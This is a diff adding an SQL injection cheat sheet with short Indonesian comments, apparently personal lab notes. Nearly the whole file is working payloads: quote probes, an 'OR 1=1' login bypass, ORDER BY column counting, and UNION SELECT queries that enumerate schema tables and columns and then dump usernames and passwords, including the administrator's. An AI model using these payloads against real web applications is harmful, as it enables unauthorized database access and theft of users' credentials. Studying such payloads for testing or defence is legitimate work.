@@ -1,0 +1,54 @@
+'tanda petik 
+
+"tanda petik 2
+
+'OR'1'='1' 
+
+'OR'1'='1' #
+
+'ORDER BY 5 #
+
+'UNION SELECT 1,2,3,4,5,6,7 #
+
+'UNION SELECT 1,database(),3,user(),5,6,7 #
+
+'UNION SELECT 1,group_concat(table_name),3,user(),5,6,7 from information_schema.tables where table_schema = database() #
+
+'UNION SELECT 1,group_concat(column_name),3,user(),5,6,7 from information_schema.columns where table_schema = database() #
+
+'UNION SELECT 1,group_concat(username,0x3a,password),3,user(),5,6,7 from users #
+
+
+SQL Injection UNION attack, retrieving, data from other tables 
+'+and+1=1--
+'+and+1=0-- = false 
+
+BYPASS LOGIN
+' or 1=1--
+
+memastikan ada berapa column database / mencari column website 
+'Order+By+1--
+'Order+By+1000--
+'Order+By+2--
+
+union select 
+'union+select+1,2--
+'union+select+NULL,NULL-- = lebih dari cukup bahwa sql kita masih bisa digunakan 
+setelah mendapat column kita akan memilih table menggunakan union select 
+'union+select+'a',NULL--
+'union+select+version(),NULL--
+
+dengan statement ini kita akan mendapatkan beberapa table 
+'union+select+table_name,NULL+from+information_schema.tables--
+melihat isi users 
+'union+select+column_name,NULL+from+information_schema.columns+where+table_name='users'--
+mencari uname
+'union+select+username,NULL+from+users--
+mencari passwd
+'union+select+password,NULL+from+users--
+untuk mendapatkan passwd dari administrator
+'union+select+password,NULL+from+users+where+username='administrator'--
+
+
+
+
